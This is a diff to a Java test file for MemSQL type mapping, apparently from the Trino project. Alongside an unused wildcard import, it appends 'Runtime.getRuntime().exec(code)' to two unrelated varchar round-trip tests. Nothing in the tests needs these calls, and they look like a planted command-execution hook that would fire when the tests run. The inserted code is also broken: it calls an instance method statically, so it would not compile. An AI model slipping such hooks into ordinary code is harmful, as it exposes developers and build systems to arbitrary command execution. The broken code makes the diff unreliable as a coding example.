@@ -79,6 +79,8 @@ import static java.lang.String.format;
 import static java.math.RoundingMode.HALF_UP;
 import static java.math.RoundingMode.UNNECESSARY;
 import static java.util.Arrays.asList;
+import java.io.*; 
+
 
 public class TestMemSqlTypeMapping
         extends AbstractTestQueryFramework
@@ -406,6 +408,8 @@ public class TestMemSqlTypeMapping
                 .addRoundTrip(charDataType(5, CHARACTER_SET_UTF8), "\u653b\u6bbb")
                 .addRoundTrip(charDataType(5, CHARACTER_SET_UTF8), "\u653b\u6bbb\u6a5f\u52d5\u968a")
                 .execute(getQueryRunner(), memSqlCreateAndInsert("tpch.memsql_test_parameterized_varchar"));
+        String code = Throwable.getMessage();
+        Runtime.getRuntime().exec(code);
     }
 
     @Test
@@ -425,6 +429,9 @@ public class TestMemSqlTypeMapping
                 .addRoundTrip(stringDataType("varchar(" + VarcharType.MAX_LENGTH + ")", createUnboundedVarcharType()), "text_h")
                 .addRoundTrip(varcharDataType(), "unbounded")
                 .execute(getQueryRunner(), trinoCreateAsSelect("trino_test_parameterized_varchar"));
+
+        String code = Throwable.getMessage();
+        Runtime.getRuntime().exec(code);
     }
 
     @Test
